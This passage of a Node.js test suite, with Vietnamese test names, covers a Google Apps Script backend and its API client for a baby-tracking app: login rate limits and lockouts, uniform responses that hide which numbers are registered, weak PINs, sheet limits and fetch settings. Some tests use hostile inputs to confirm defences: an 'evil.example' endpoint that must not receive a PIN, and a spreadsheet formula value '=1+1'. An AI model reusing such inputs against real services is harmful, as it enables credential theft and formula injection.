  T('bảng đầy mà mọi dòng đang khóa → số mới nhận rate_limited (không ghi thêm dòng)', envF.post({ action: 'login', phone: newPhone(), pin: WRONG }).error === 'rate_limited' && rows(envF, 'DangNhapSai').length === 3);
  T('mỗi tab chỉ giữ đúng số cột của SCHEMA (không 26 cột trống)', DATA_TABS.every(n => env.sheet(n).getMaxColumns() === env.sheet(n).values()[0].length) && env.sheet('ChuRieng', 'priv').getMaxColumns() === 8,
    DATA_TABS.map(n => n + ':' + env.sheet(n).getMaxColumns()));
  {
    const envU = fresh();
    const pU = newPhone();
    const res = []; let started = 1, depth = 0; const fired = new Set();
    envU.hooks.onDigest = info => {
      if (!info.bytes || info.inLock || fired.has(depth) || started >= 30) return;
      fired.add(depth); depth++; envU.hooks._inHook = false;
      try { while (started < 30) { started++; res.push(envU.post({ action: 'login', phone: pU, pin: WRONG })); } } finally { depth--; envU.hooks._inHook = true; }
    };
    res.push(envU.post({ action: 'login', phone: pU, pin: WRONG }));
    envU.hooks.onDigest = null;
    const nb = res.filter(r => r.error === 'bad_credentials').length;
    T('số CHƯA đăng ký (đếm trong đệm): 30 lượt đồng thời vẫn chỉ ≤ 5 lượt được băm', res.length === 30 && nb >= 1 && nb <= 5 && res.filter(r => r.error === 'locked').length === 30 - nb, nb);
  }
  // Khóa cố định 15 phút, kể cả chờ quá 6 giờ; số đã / chưa đăng ký: cùng phản hồi, cùng số lời gọi Sheet / băm
  const run = (e, ph) => {
    const out = [], calls = [];
    const step = () => { const s0 = [e.stats.sheetReads, e.stats.sheetWrites, e.stats.digest]; const r = e.post({ action: 'login', phone: ph, pin: WRONG }); calls.push([e.stats.sheetReads - s0[0], e.stats.sheetWrites - s0[1], e.stats.digest - s0[2]]); return r; };
    for (let i = 0; i < 4; i++) out.push(JSON.stringify(step()));
    e.advance(7 * HOUR);                                       // quá cửa sổ 6 giờ: đếm lại từ 0
    for (let i = 0; i < 5; i++) out.push(JSON.stringify(step()));
    out.push(JSON.stringify(step()));                          // đang khóa
    e.advance(7 * HOUR);
    for (let i = 0; i < 5; i++) out.push(JSON.stringify(step()));   // khóa lần 2 sau 7 giờ: vẫn 15 phút
    e.advance(15 * 60000 + 1000);
    for (let i = 0; i < 5; i++) out.push(JSON.stringify(step()));   // khóa lần 3 liền sau: vẫn 15 phút
    return { out, calls };
  };
  const envA = fresh(), envB = fresh();
  const pa = newPhone(); reg(envA, pa);
  envB.post({ action: 'register', phone: newPhone(), pin: PIN, consent: consent() });   // hai env cùng cỡ bảng
  const ra = run(envA, pa), rb = run(envB, newPhone());
  const locks = ra.out.map(x => JSON.parse(x)).filter(x => x.retryAfterSec).map(x => x.retryAfterSec);
  T('khóa luôn CỐ ĐỊNH 15 phút (lần 1, lần 2 sau 7 giờ, lần 3 liền sau)', locks.length >= 3 && locks.every(x => x === 900 || x <= 900), locks);
  T('chờ 7 giờ (quá cửa sổ 6 giờ) → đếm lại: còn 4 lần', JSON.parse(ra.out[4]).remaining === 4);
  T('số chưa đăng ký: chuỗi phản hồi GIỐNG HỆT số đã đăng ký, kể cả qua các lần chờ 7 giờ', JSON.stringify(ra.out) === JSON.stringify(rb.out), [ra.out, rb.out]);
  T('số đã / chưa đăng ký: cùng số lời gọi Sheet (đọc, ghi) và cùng số lần băm ở MỌI lượt', JSON.stringify(ra.calls) === JSON.stringify(rb.calls), [ra.calls.slice(0, 3), rb.calls.slice(0, 3)]);
  const envR = fresh(); const pr = newPhone(); reg(envR, pr);
  envR.post({ action: 'login', phone: newPhone(), pin: WRONG });   // bảng DangNhapSai không trống (như thực tế) cho cả hai lượt đo
  const sr0 = [envR.stats.sheetReads, envR.stats.sheetWrites, envR.stats.digest];
  envR.post({ action: 'setPinAfterReset', phone: pr, code: '123456', pin: PIN2 });
  const sr1 = [envR.stats.sheetReads, envR.stats.sheetWrites, envR.stats.digest];
  envR.post({ action: 'setPinAfterReset', phone: newPhone(), code: '123456', pin: PIN2 });
  const sr2 = [envR.stats.sheetReads, envR.stats.sheetWrites, envR.stats.digest];
  T('setPinAfterReset sai: số đã / chưa đăng ký cùng số lời gọi Sheet và lần băm', JSON.stringify(sr1.map((x, i) => x - sr0[i])) === JSON.stringify(sr2.map((x, i) => x - sr1[i])), [sr1.map((x, i) => x - sr0[i]), sr2.map((x, i) => x - sr1[i])]);
  T('đặt lại PIN xóa khóa', (envA.resetPin(pa), rows(envA, 'DangNhapSai')[0][3] === 0 && rows(envA, 'DangNhapSai')[0][1] === 0));
  {
    const envW = fresh();
    T('file còn nhỏ: checkSetup_ báo "dưới 70 % trần", cleanupDaily_ không cảnh báo', envW.ctx.checkSetup_().lines.some(l => /dưới 70 %/.test(l)) && envW.ctx.cleanupDaily_().warnings.length === 0);
    envW.sheet('DemConDap').maxRows = 400000;      // 400.000 × 18 cột = 7,2 triệu ô (> 70 %)
    const cw = envW.ctx.checkSetup_(), cd = envW.ctx.cleanupDaily_();
    T('file vượt 70 % trần 10 triệu ô → checkSetup_ CẦN SỬA + dòng cảnh báo, cleanupDaily_ ghi Nhật ký', cw.ok === false && cw.lines.some(l => /CẢNH BÁO: file "MBAY – Dữ liệu" đã dùng 7\d %/.test(l)) && cd.warnings.length === 1 && envW.logs.some(l => /^cleanupDaily: CẢNH BÁO/.test(l)), cw.lines);
  }
  // Trình kích hoạt dọn dẹp bắt buộc
  T('setup tự cài trình kích hoạt cleanupDaily hằng ngày lúc 2 giờ (một lần dù chạy setup nhiều lần)', (env.setup(), env.triggers.length === 1 && env.triggers[0].getHandlerFunction() === 'cleanupDaily' && env.triggers[0].days === 1 && env.triggers[0].hour === 2));
  T('checkSetup_ báo có trình kích hoạt', env.ctx.checkSetup_().lines.some(l => /cleanupDaily: có/.test(l)));
  const envT = fresh({ noSetup: true }); envT.denyTriggers = true; envT.setup();
  T('không cài được trình kích hoạt → setup log rõ BƯỚC 10, checkSetup_ báo CẦN SỬA', envT.logs.some(l => /CHƯA cài được trình kích hoạt/.test(l)) && envT.ctx.checkSetup_().ok === false);
  // Lưới Sheet thật: tab mới 1.000 dòng, getRange ngoài lưới thì lỗi
  const envG = fresh();
  const pg = newPhone(); const sg = reg(envG, pg);
  let threw = null;
  try { for (let i = 0; i < 1100; i++) envG.ctx.writeRow_('ThaiGiao', -1, ['10:00:00 29/10/2026', 'u' + 'f'.repeat(23), 'g' + String(i).padStart(15, '0'), DAY, 'TG-01', 'Đã làm', 1]); } catch (e) { threw = e.message; }
  T('ghi quá 1.000 dòng: tự thêm dòng lưới, không lỗi "outside the dimensions"', !threw && rows(envG, 'ThaiGiao').length === 1100 && envG.sheet('ThaiGiao').getMaxRows() >= 1101, threw);
  const envD = fresh();
  const sd = reg(envD, newPhone());
  const sh = envD.sheet('ThoiQuen'); sh.deleteRows(3, sh.getMaxRows() - 2);
  save(envD, sd.token, [habit()]);
  T('xóa khi dòng dữ liệu là dòng cuối lưới: không lỗi "delete all non-frozen rows"', envD.post({ action: 'deleteAccount', token: sd.token, confirm: 'DELETE' }).result === 'success' && rows(envD, 'ThoiQuen').length === 0);
}

section('R5. Thời gian trả lời phẳng, PIN yếu thêm mẫu bàn phím, ChuRieng lọc theo Loại, born');
{
  const env = fresh({ consts: { PIN_HASH_ITER: 10 } });
  const p = newPhone(); reg(env, p);
  env.ctx.PIN_HASH_ITER = 100;
  let d0 = env.stats.digest; env.post({ action: 'login', phone: p, pin: WRONG }); const a = env.stats.digest - d0;
  d0 = env.stats.digest; env.post({ action: 'login', phone: newPhone(), pin: WRONG }); const b = env.stats.digest - d0;
  T('sau khi tăng PIN_HASH_ITER: số đã đăng ký (băm cũ) và chưa đăng ký băm cùng số vòng (±2)', Math.abs(a - b) <= 2 && a >= 100, [a, b]);
  const extra = ['147258', '258369', '159753', '789456', '456123', '147852', '520520', '131420', '123654', '321654'];
  T('PIN mẫu bàn phím / số đẹp → pin_weak (FE-2 cần thêm vào PIN.weakList)', extra.every(x => env.post({ action: 'register', phone: newPhone(), pin: x, consent: consent() }).error === 'pin_weak'));
  // probe 1 ca D/E
  const e2 = fresh();
  const s = reg(e2, newPhone(), { consent: consent(true) });
  const id = rid();
  save(e2, s.token, [letter({ id, text: 'Thư cho con' })]);
  save(e2, s.token, [checkin({ id, note: 'kể thêm' })]);
  save(e2, s.token, [checkin({ id })]);
  const pr = rows(e2, 'ChuRieng', 'priv');
  T('cùng mã ở lời nhắn và check-in: "kể thêm" không đè, không xóa lời nhắn (lọc theo Loại)', pr.length === 1 && pr[0][2] === 'Lời nhắn cho con' && pr[0][6] === 'Thư cho con', pr);
  const sA = reg(e2, newPhone()), id2 = rid();
  save(e2, s.token, [letter({ id: id2 })]);
  T('mã lời nhắn của người khác không chặn check-in (khác Loại) của mình', save(e2, sA.token, [checkin({ id: id2 })]).saved.length === 1);
  // born (AC-138)
  const e3 = fresh();
  const b3 = reg(e3, newPhone());
  T('profile có born → lưu cột "Con đã chào đời"', save(e3, b3.token, [profile({ edd: '2027-01-21', born: DAY })]).saved.length === 1 && rows(e3, 'HoSo')[0][2] === DAY && e3.sheet('HoSo').values()[0][2] === 'Con đã chào đời');
  T('whoami / listMine / exportMine / login trả born', e3.post({ action: 'whoami', token: b3.token }).born === DAY && list(e3, b3.token, { kinds: ['profile'] }).records.profile.born === DAY &&
    e3.post({ action: 'exportMine', token: b3.token }).account.born === DAY && e3.post({ action: 'login', phone: rows(e3, 'NguoiDung')[0][1], pin: PIN }).born === DAY);
  T('profile không gửi born → giữ born đang lưu; gửi null → hoàn tác', (save(e3, b3.token, [profile({ edd: '2027-01-22' })]), e3.post({ action: 'whoami', token: b3.token }).born === DAY) &&
    (save(e3, b3.token, [profile({ born: null })]), e3.post({ action: 'whoami', token: b3.token }).born === null));
  const bb = ['2026-10-31', '2026-02-30', '29/10/2026', 20261029, '=1+1'].map(x => save(e3, b3.token, [profile({ born: x })]).rejected[0]);
  T('born sau ngàyThựcHiện + 1, ngày không có thật, sai dạng → record_invalid field born', bb.every(r => r && r.field === 'born') && save(e3, b3.token, [profile({ born: '2026-10-30' })]).saved.length === 1);
  T('register / Session có born (null)', reg(e3, newPhone()).born === null);
}

/* =====================================================================
 * Q. S-12, S-13 phần client (js/api.js nạp trong vm với fetch giả; HTTP thật ở test-mock-api.js)
 * ===================================================================== */
section('Q. S-12 text/plain, timeout; S-13 ẩn danh không gửi gì (js/api.js)');
(async () => {
  const API_SRC = fs.readFileSync(path.join(APP, 'js', 'api.js'), 'utf8');
  const GAS = 'https://script.google.com/macros/s/AKfycbTESTtestTEST123/exec';
  function loadApi(cfg, fetchImpl) {
    const calls = [];
    const win = { LSTP_CONFIG: Object.assign({ API_TIMEOUT_MS: 200, LOGIN_TIMEOUT_MS: 300 }, cfg) };
    const ctx = vm.createContext({ window: win, AbortController, setTimeout, clearTimeout, console: { log() { calls.push('console'); } },
      fetch: fetchImpl ? (u, init) => { calls.push({ u, init }); return fetchImpl(u, init); } : undefined });
    vm.runInContext(API_SRC, ctx);
    return { A: win.LSTP_API, calls };
  }
  const okFetch = () => Promise.resolve({ ok: true, status: 200, text: () => Promise.resolve('{"result":"success"}') });
  const NAMES = ['ping', 'register', 'login', 'setPinAfterReset', 'whoami', 'logout', 'saveRecords', 'listMine', 'exportMine', 'deleteRecords', 'setConsent', 'deleteAccount'];
  const off = loadApi({ ACCOUNT_ENABLED: false, GOOGLE_SCRIPT_URL: GAS }, okFetch);
  const offRes = await Promise.all(NAMES.map(n => off.A[n]('t', [])));
  T('S-13: ACCOUNT_ENABLED=false → 12 hàm trả no_url, KHÔNG gọi fetch', offRes.every(r => r.result === 'error' && r.error === 'no_url') && off.calls.length === 0);
  const on = loadApi({ ACCOUNT_ENABLED: true, GOOGLE_SCRIPT_URL: GAS }, okFetch);
  await on.A.saveRecords('a'.repeat(64), [{ kind: 'habit' }]);
  const c = on.calls[0];
  T('S-12: POST, chỉ header Content-Type text/plain;charset=utf-8, redirect follow, credentials omit, no-store', c && c.u === GAS && c.init.method === 'POST' && JSON.stringify(c.init.headers) === '{"Content-Type":"text/plain;charset=utf-8"}' && c.init.redirect === 'follow' && c.init.credentials === 'omit' && c.init.cache === 'no-store', c && c.init);
  const body = JSON.parse(c.init.body);
  T('S-12: token chỉ trong thân, không trên URL; thân có action + v', body.token === 'a'.repeat(64) && body.action === 'saveRecords' && body.v === '1' && !c.u.includes('a'.repeat(64)));
  T('api.js không console.log', on.calls.every(x => x !== 'console') && !/console\.(log|info|warn|error|debug)/.test(API_SRC.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:'"])\/\/[^\n]*/g, '$1')));
  const evil = loadApi({ ACCOUNT_ENABLED: true, GOOGLE_SCRIPT_URL: 'https://evil.example/macros/s/x/exec' }, okFetch);
  T('URL không phải script.google.com → no_url, không gửi PIN đi đâu', (await evil.A.login({ phone: '1', pin: '2' })).error === 'no_url' && evil.calls.length === 0);
  const mockBad = loadApi({ ACCOUNT_ENABLED: true, MOCK: true, MOCK_URL: 'http://10.0.0.5:8790/exec' }, okFetch);
  T('MOCK với địa chỉ không phải 127.0.0.1/localhost → no_url', (await mockBad.A.ping()).error === 'no_url' && mockBad.calls.length === 0);
  const hang = loadApi({ ACCOUNT_ENABLED: true, GOOGLE_SCRIPT_URL: GAS }, (u, init) => new Promise((res, rej) => { init.signal.addEventListener('abort', () => rej(new Error('aborted'))); }));
  T('S-12: treo → timeout (resolve, không ném)', (await hang.A.whoami('x')).error === 'timeout');
  const net = loadApi({ ACCOUNT_ENABLED: true, GOOGLE_SCRIPT_URL: GAS }, () => Promise.reject(new TypeError('Failed to fetch')));
  T('lỗi mạng → network', (await net.A.whoami('x')).error === 'network');
  const html = loadApi({ ACCOUNT_ENABLED: true, GOOGLE_SCRIPT_URL: GAS }, () => Promise.resolve({ ok: true, status: 200, text: () => Promise.resolve('<html>Đăng nhập Google</html>') }));
  T('trang HTML (deploy sai quyền) → bad_response', (await html.A.ping()).error === 'bad_response');
  const odd = loadApi({ ACCOUNT_ENABLED: true, GOOGLE_SCRIPT_URL: GAS }, () => Promise.resolve({ ok: true, status: 200, text: () => Promise.resolve('{"hello":1}') }));
  T('JSON không đúng shape → bad_response', (await odd.A.ping()).error === 'bad_response');
  T('isTransient: network/timeout/server_busy/rate_limited là tạm; session_expired, record_invalid thì không', on.A.isTransient({ result: 'error', error: 'timeout' }) && on.A.isTransient({ result: 'error', error: 'server_busy' }) && !on.A.isTransient({ result: 'error', error: 'session_expired' }) && !on.A.isTransient({ result: 'success' }));
  T('deleteAccount gửi confirm DELETE', (await (async () => { const x = loadApi({ ACCOUNT_ENABLED: true, GOOGLE_SCRIPT_URL: GAS }, okFetch); await x.A.deleteAccount('t'); return JSON.parse(x.calls[0].init.body).confirm; })()) === 'DELETE');

  /* ===== Kết: không env nào ghi chuỗi công thức trần ===== */
  section('Tổng kết toàn bộ env');
  const fw = ENVS.flatMap(e => e.formulaWrites);
  T('S-08: không có lần ghi nào chuỗi = + - @ tab CR mà thiếu dấu \' (mọi env, mọi tab)', fw.length === 0, fw.slice(0, 3));
  console.log('\n' + passes + ' PASS · ' + fails + ' FAIL');
  process.exit(fails ? 1 : 0);
})().catch(e => { console.error('LỖI TEST: ' + (e && e.stack || e)); process.exit(1); });
